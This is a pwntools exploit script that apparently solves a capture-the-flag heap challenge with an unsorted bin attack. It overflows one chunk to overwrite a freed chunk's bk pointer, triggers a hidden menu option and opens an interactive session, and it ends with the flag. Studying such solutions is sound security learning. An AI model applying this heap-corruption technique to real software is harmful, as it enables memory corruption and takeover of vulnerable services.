#!/usr/bin/env python 

from pwn import *

#########################################
# bck = victim->bk;		     	#
#					#
# unsorted_chunks (av)->bk = bck;	#
# bck->fd = unsorted_chunks (av);	#
#########################################

# Unsorted Bin Attack
# if we can can change the bk with value AAA
# than when remove the chunk from unsorted bin  (victim is the chunk will be remove from unsort bin)
# it will cause AAA+0x10(bck->fd)  = add of unsorted_chunks
# and ...........

# * only one unsorted Bin can't cause attack , min is two 
# * unsort bin is FIFO

# Look at the code 
# You can input the size withou check the original size, and it cause a heap overflow 

def add(size, content):
	r.sendlineafter(':','1')
	r.sendlineafter(':',str(size))
	r.sendlineafter(':',content)

def delet(index):
	r.sendlineafter(':','3')
	r.sendlineafter(':',str(index))

def edit(index,size,context):
	r.sendlineafter(':','2')
	r.sendlineafter(':',str(index))
	r.sendlineafter(':',str(size))
	r.sendlineafter(':',context)

r = remote('192.168.31.25',12025)
magic = 0x6020c0

# Step 1 : make enough chunk for unsorted bin attack 
#	size should big enough or it will in fast bin after free
#	and make a nomal chunk between each chunk  to avoid consolidate

add(128,'aaa') # second unsorted
add(128,'bbb') # nomal
add(128,'ccc') # (victim)
add(128,'ddd') # nomal

# Step 2 : put chunk into unsorted bin by free

delet(2) # because FIFO so free this first 
delet(0)

# Step 3 : 
# 	so far the heap stack will like this
#	------ chunk 0 (freed) -----
#	------ chunk 1 (nomal) -----
#	------ chunk 2 (freed) -----
#	------ chunk 3 (nomal) -----
#       ------      top	       -----
#  So we can use chunk 1 to edit chunk 2 and write magic-0x10 to bk

context = 'A'*128 + p64(0) + p64(0x90) + 'A'*8 + p64(magic-0x10)
edit(1,128 + 16 + 16, context)

# Step 4 : malloc again to remove the chunk2 from unsorted bin 
#	   and than bck->fd  = add of unsorted bin 
#	            magic-0x10 + 0x10 = addr_unsorted_bin   ( usually a big number )

add(128,'eee')

# Step 5 : use the hidden function from the question

r.sendlineafter(':','4869')


r.interactive()




#AD{Uns0rt3d_b1n_is_s0_w34k}







